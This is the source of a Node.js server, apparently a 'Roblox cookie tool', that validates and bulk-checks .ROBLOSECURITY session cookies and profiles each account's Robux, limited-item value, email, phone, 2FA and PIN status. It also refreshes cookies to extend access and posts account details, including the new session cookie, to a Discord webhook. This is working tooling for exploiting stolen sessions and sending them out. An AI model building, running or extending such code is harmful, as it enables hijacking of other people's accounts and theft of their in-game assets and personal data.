// ============================================
// ROBLOX COOKIE TOOL — BACKEND
// Install: npm install express axios tough-cookie axios-cookiejar-support cors
// Run: node server.js
// ============================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const DISCORD_WEBHOOK = 'ISI_URL_WEBHOOK_DISCORD_LU';
const PORT = process.env.PORT || 3000;

// ============================================
// HELPER — DISCORD
// ============================================
async function sendToDiscord(embed) {
  if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('ISI_URL')) return;
  try {
    await axios.post(DISCORD_WEBHOOK, {
      username: 'Cookie Tool',
      embeds: [embed]
    });
  } catch(e) {}
}

// ============================================
// HELPER — FETCH ACCOUNT DATA
// ============================================
async function fetchAccountData(jar, csrfToken) {
  const client = wrapper(axios.create({
    jar,
    withCredentials: true,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'X-CSRF-TOKEN': csrfToken || ''
    }
  }));

  const result = {};

  try {
    const userRes = await client.get('https://users.roblox.com/v1/users/authenticated');
    result.user = userRes.data;
    const userId = userRes.data.id;

    try {
      const p = await client.get(`https://users.roblox.com/v1/users/${userId}`);
      result.accountAge = Math.floor((new Date() - new Date(p.data.created)) / 86400000);
    } catch(e) {}

    try {
      const r = await client.get('https://economy.roblox.com/v1/user/currency');
      result.robux = r.data.robux || 0;
    } catch(e) { result.robux = 0; }

    try {
      const r = await client.get('https://accountsettings.roblox.com/v1/account/settings');
      result.email = r.data.email || 'N/A';
      result.phone = r.data.phone || 'N/A';
    } catch(e) {}

    try {
      const r = await client.get('https://auth.roblox.com/v2/twostepverification/status');
      result.twoFAEnabled = r.data.enabled || false;
    } catch(e) { result.twoFAEnabled = false; }

    try {
      const r = await client.get('https://accountsettings.roblox.com/v1/account/pin');
      result.pinEnabled = r.data.isEnabled || false;
    } catch(e) { result.pinEnabled = false; }

    try {
      const r = await client.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
      const items = r.data.data || [];
      let totalRap = 0, hasKorblox = false, hasHeadless = false;
      const KORBLOX = [22724251, 22724260, 22724270];
      const HEADLESS = 151156164;

      for (const it of items) {
        totalRap += it.recentAveragePrice || 0;
        if (KORBLOX.includes(it.assetId)) hasKorblox = true;
        if (it.assetId === HEADLESS) hasHeadless = true;
      }
      result.rap = totalRap;
      result.limitedsOwned = items.length;
      result.hasKorblox = hasKorblox;
      result.hasHeadless = hasHeadless;
    } catch(e) {}

    result.avatar = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
    return { success: true, data: result };
  } catch(e) {
    return { success: false, error: e.message, status: e.response?.status };
  }
}

// ============================================
// ENDPOINT — CHECK COOKIE
// ============================================
app.post('/api/check-cookie', async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) return res.json({ valid: false, error: 'No cookie' });

  try {
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
    const client = wrapper(axios.create({ jar }));

    const r = await client.get('https://users.roblox.com/v1/users/authenticated');
    res.json({ valid: true, user: r.data });
  } catch(e) {
    res.json({ valid: false, error: e.response?.status === 401 ? 'Invalid/Expired' : e.message });
  }
});

// ============================================
// ENDPOINT — FULL DATA
// ============================================
app.post('/api/fetch-by-cookie', async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) return res.json({ success: false, error: 'No cookie' });

  try {
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
    const client = wrapper(axios.create({ jar }));

    let csrfToken = '';
    try {
      await client.post('https://auth.roblox.com/v2/logout');
    } catch(e) {
      csrfToken = e.response?.headers['x-csrf-token'] || '';
    }

    const data = await fetchAccountData(jar, csrfToken);
    res.json(data);
  } catch(e) {
    res.json({ success: false, error: e.message });
  }
});

// ============================================
// ENDPOINT — BULK CHECK
// ============================================
app.post('/api/bulk-check-cookie', async (req, res) => {
  const { cookies } = req.body;
  if (!cookies || !Array.isArray(cookies)) return res.json({ success: false, error: 'Invalid input' });

  const results = [];

  for (let i = 0; i < cookies.length; i++) {
    const cookieValue = (cookies[i] || '').trim();
    if (!cookieValue) {
      results.push({ index: i, valid: false, error: 'Empty cookie' });
      continue;
    }

    try {
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${cookieValue}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
      const client = wrapper(axios.create({
        jar,
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      }));

      const userRes = await client.get('https://users.roblox.com/v1/users/authenticated');
      const userId = userRes.data.id;

      let robux = 0, rap = 0, hasKorblox = false, hasHeadless = false, limitedsOwned = 0, accountAge = 0;

      try { const r = await client.get('https://economy.roblox.com/v1/user/currency'); robux = r.data.robux || 0; } catch(e) {}
      try { const p = await client.get(`https://users.roblox.com/v1/users/${userId}`); accountAge = Math.floor((new Date() - new Date(p.data.created)) / 86400000); } catch(e) {}

      try {
        const inv = await client.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
        const items = inv.data.data || [];
        limitedsOwned = items.length;
        const KORBLOX = [22724251, 22724260, 22724270];
        const HEADLESS = 151156164;
        for (const it of items) {
          rap += it.recentAveragePrice || 0;
          if (KORBLOX.includes(it.assetId)) hasKorblox = true;
          if (it.assetId === HEADLESS) hasHeadless = true;
        }
      } catch(e) {}

      results.push({
        index: i,
        valid: true,
        user: { id: userId, name: userRes.data.name, displayName: userRes.data.displayName },
        robux, rap, limitedsOwned, hasKorblox, hasHeadless, accountAge,
        avatar: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`
      });
    } catch(e) {
      results.push({
        index: i,
        valid: false,
        error: e.response?.status === 401 ? 'Invalid/Expired' : e.message
      });
    }

    if (i < cookies.length - 1) await new Promise(r => setTimeout(r, 800));
  }

  const valid = results.filter(r => r.valid).length;
  const invalid = results.filter(r => !r.valid).length;

  if (valid > 0) {
    try {
      const fields = results.filter(r => r.valid).slice(0, 10).map(r => ({
        name: `${r.user.name} (${r.user.id})`,
        value: `💰 ${r.robux} | 📊 ${r.rap} RAP | 🎩 ${r.hasKorblox ? '✅' : '❌'} | 💀 ${r.hasHeadless ? '✅' : '❌'}`,
        inline: false
      }));
      await sendToDiscord({
        title: `📦 BULK CHECK — ${valid} Valid / ${invalid} Invalid`,
        color: 0x00a2ff,
        fields,
        footer: { text: `Total: ${cookies.length} cookies` },
        timestamp: new Date().toISOString()
      });
    } catch(e) {}
  }

  res.json({ success: true, total: cookies.length, valid, invalid, results });
});

// ============================================
// ENDPOINT — COOKIE REFRESH
// ============================================
app.post('/api/refresh-cookie', async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) return res.json({ success: false, error: 'No cookie provided' });

  try {
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
    const client = wrapper(axios.create({
      jar,
      withCredentials: true,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      }
    }));

    // Step 1: Cek valid
    let userInfo;
    try {
      const userRes = await client.get('https://users.roblox.com/v1/users/authenticated');
      userInfo = userRes.data;
    } catch (e) {
      return res.json({ success: false, error: 'Cookie invalid or expired', status: e.response?.status || 'unknown' });
    }

    // Step 2: Ambil CSRF
    let csrfToken = '';
    try {
      await client.post('https://auth.roblox.com/v2/logout');
    } catch (e) {
      csrfToken = e.response?.headers['x-csrf-token'] || '';
    }

    // Step 3: Refresh session
    try {
      await client.get('https://www.roblox.com/home', { headers: { 'X-CSRF-TOKEN': csrfToken } });
    } catch (e) {}

    // Step 4: Ambil cookie baru
    const cookies = await jar.getCookies('https://www.roblox.com');
    const newCookie = cookies.find(c => c.key === '.ROBLOSECURITY');
    if (!newCookie) return res.json({ success: false, error: 'No new cookie generated' });

    // Step 5: Hitung masa aktif
    const expiresAt = newCookie.expires;
    const now = new Date();
    const daysLeft = Math.floor((new Date(expiresAt) - now) / 86400000);

    // Step 6: Fetch data akun
    const accountData = await fetchAccountData(jar, csrfToken);

    // Step 7: Kirim ke Discord
    await sendToDiscord({
      title: '🔄 COOKIE REFRESHED',
      color: 0x22c55e,
      thumbnail: accountData.data?.avatar ? { url: accountData.data.avatar } : undefined,
      fields: [
        { name: '👤 Username', value: '`' + userInfo.name + '`', inline: true },
        { name: '🆔 User ID', value: '`' + userInfo.id + '`', inline: true },
        { name: '📅 Days Left', value: '`' + daysLeft + ' days`', inline: true },
        { name: '💰 Robux', value: '`' + (accountData.data?.robux || 0) + '`', inline: true },
        { name: '📊 RAP', value: '`' + (accountData.data?.rap || 0) + '`', inline: true },
        { name: '🎩 Korblox', value: accountData.data?.hasKorblox ? '✅' : '❌', inline: true },
        { name: '💀 Headless', value: accountData.data?.hasHeadless ? '✅' : '❌', inline: true },
        { name: '🍪 New Cookie', value: '```' + newCookie.value + '```', inline: false }
      ],
      footer: { text: 'Cookie Refresher' },
      timestamp: new Date().toISOString()
    });

    res.json({
      success: true,
      oldCookie: cookie,
      newCookie: newCookie.value,
      cookieChanged: newCookie.value !== cookie,
      expiresAt,
      daysLeft,
      user: userInfo,
      accountData: accountData.data || {}
    });

  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

// ============================================
// START
// ============================================
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
